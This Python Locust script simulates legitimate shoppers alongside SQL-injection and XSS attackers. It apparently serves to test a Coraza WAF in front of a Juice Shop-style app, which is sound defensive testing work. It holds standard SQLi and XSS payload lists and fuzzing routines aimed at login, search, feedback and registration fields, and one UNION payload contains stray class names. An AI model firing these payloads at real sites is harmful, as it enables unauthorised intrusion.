import random
import urllib.parse
from locust import HttpUser, TaskSet, task, between

# --- Configuration ---
# The host will be set by the Locust command line argument --host
# e.g., locust -f generate_traffic.py --host=http://coraza-proxy-waf:8080
# This script assumes it's running within the Docker Compose network
# where 'coraza-proxy-waf' is resolvable.

# --- Fuzzing Payloads ---

# Common SQL Injection payloads for fuzzing
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin' OR '1'='1'--",
    "1 UNION SELECT @@version, NULL, NULL, NULL, NULL, LegitimateUser, AttackerUser"
]

    # Common XSS payloads for fuzzing
XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert('XSS')\">Click me</a>",
    "\"--><script>alert(1)</script>",
    "<script>console.log('XSS')</script>", # Less disruptive, might bypass some WAFs
    "<sCrIpT>alert(1)</sCrIpT>", # Case variation
    "data:text/html,<script>alert(1)</script>" # Data URI
]

# --- Legitimate User Behavior ---
class LegitimateUser(TaskSet):
    @task(3) # Higher weight means this task is more likely to be chosen
    def view_homepage(self):
        self.client.get("/")

    @task(2)
    def browse_products(self):
        # Simulate browsing products, potentially with a search query
        search_terms = ["apple", "juice", "lemon", "banana", "orange"]
        query = random.choice(search_terms)
        self.client.get(f"/rest/products/search?q={query}")

    @task(1)
    def view_product_details(self):
        # Simulate viewing a specific product (assuming product IDs 1-10 exist)
        product_id = random.randint(1, 10)
        self.client.get(f"/rest/products/{product_id}")

    @task(1)
    def login_attempt(self):
        # Simulate a login attempt (even with dummy credentials)
        self.client.post("/rest/user/login", json={
            "email": "test@example.com",
            "password": "password123"
        })

    @task(1)
    def register_user(self):
        # Simulate a user registration attempt
        email = f"user{random.randint(1000, 9999)}@example.com"
        password = "securepassword" + str(random.randint(1, 1000))
        self.client.post("/api/Users/", json={
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityAnswer": "My pet's name"
        })


# --- Attack User Behavior ---

class SQLiAttacker(TaskSet):
    @task(5)
    def sqli_search_fuzzing(self):
        payload = random.choice(SQLI_PAYLOADS)
        # URL encode the payload for safe transmission in query parameters
        encoded_payload = urllib.parse.quote_plus(payload)
        
        # Target common search endpoints
        paths = [
            "/rest/products/search",
            "/rest/product/search", # Common typo/alternative
            "/search"
        ]
        path = random.choice(paths)
        
        # Try different parameter names
        params = ["q", "query", "id", "category"]
        param = random.choice(params)

        self.client.get(f"{path}?{param}={encoded_payload}", name=f"{path}?{param}=[SQLi_FUZZ]")
        self.client.get(f"{path}?{param}={encoded_payload}'", name=f"{path}?{param}=[SQLi_FUZZ_QUOTE]")


    @task(3)
    def sqli_product_id_fuzzing(self):
        # Target product ID endpoints
        product_id_base = random.randint(1, 10)
        payload = random.choice(SQLI_PAYLOADS)
        
        # Attempt to inject into the path itself or via a query param on a product path
        # Note: Path injection might require specific web server configurations to be vulnerable
        # but we're simulating attempts.
        self.client.get(f"/rest/products/{product_id_base}{payload}", name="/rest/products/[SQLi_FUZZ_PATH]")
        self.client.get(f"/rest/products/{product_id_base}?id={payload}", name="/rest/products/[SQLi_FUZZ_QUERY_ID]")

    @task(2)
    def sqli_login_fuzzing(self):
        payload = random.choice(SQLI_PAYLOADS)
        self.client.post("/rest/user/login", json={
            "email": f"admin{payload}@example.com",
            "password": "password"
        }, name="/rest/user/login/[SQLi_EMAIL]")
        
        self.client.post("/rest/user/login", json={
            "email": "admin@example.com",
            "password": f"password{payload}"
        }, name="/rest/user/login/[SQLi_PASSWORD]")

class XSSAttacker(TaskSet):

    @task(5)
    def xss_search_fuzzing(self):
        payload = random.choice(XSS_PAYLOADS)
        encoded_payload = urllib.parse.quote_plus(payload) # URL encode for query parameters
        
        paths = [
            "/rest/products/search",
            "/search",
            "/#/search" # Common SPA search path
        ]
        path = random.choice(paths)
        
        params = ["q", "query", "term"]
        param = random.choice(params)

        self.client.get(f"{path}?{param}={encoded_payload}", name=f"{path}?{param}=[XSS_FUZZ_GET]")

    @task(3)
    def xss_feedback_fuzzing(self):
        payload = random.choice(XSS_PAYLOADS)
        # Attempt to inject XSS into a feedback message or comment field
        self.client.post("/api/Feedbacks/", json={
            "comment": f"This is a test feedback with {payload}",
            "rating": random.randint(1, 5)
        }, name="/api/Feedbacks/[XSS_POST_COMMENT]")

    @task(2)
    def xss_registration_fuzzing(self):
        payload = random.choice(XSS_PAYLOADS)
        email = f"{payload}@example.com" # XSS in email
        password = "password123"
        self.client.post("/api/Users/", json={
            "email": email,
            "password": password,
            "passwordRepeat": password,
            "securityAnswer": "My pet's name"
        }, name="/api/Users/[XSS_EMAIL]")

        # XSS in security answer
        email_clean = f"user{random.randint(1000, 9999)}@example.com"
        self.client.post("/api/Users/", json={
            "email": email_clean,
            "password": password,
            "passwordRepeat": password,
            "securityAnswer": payload
        }, name="/api/Users/[XSS_SECURITY_ANSWER]")

# Define the ratio of different user types
# For example, 70% legitimate, 20% SQLi, 10% XSS
# This is a simple way to combine different HttpUser classes
# More complex scenarios might involve a custom Environment.
class WebsiteUser(HttpUser):
    # Simulate realistic user behavior with varying wait times
    wait_time = between(1, 5) # Users wait between 1 and 5 seconds between tasks

    # Define the tasks for different user types
    # The weight determines how often this TaskSet is chosen
    tasks = {
        LegitimateUser: 7, # 70% of the time, users will be legitimate
        SQLiAttacker: 2,   # 20% of the time, users will perform SQLi attacks
        XSSAttacker: 1,    # 10% of the time, users will perform XSS attacks
    }

    # Set a host for the Locust run. This can be overridden by --host CLI arg.
    host = "http://localhost:8080" # Default, will be overridden by Docker Compose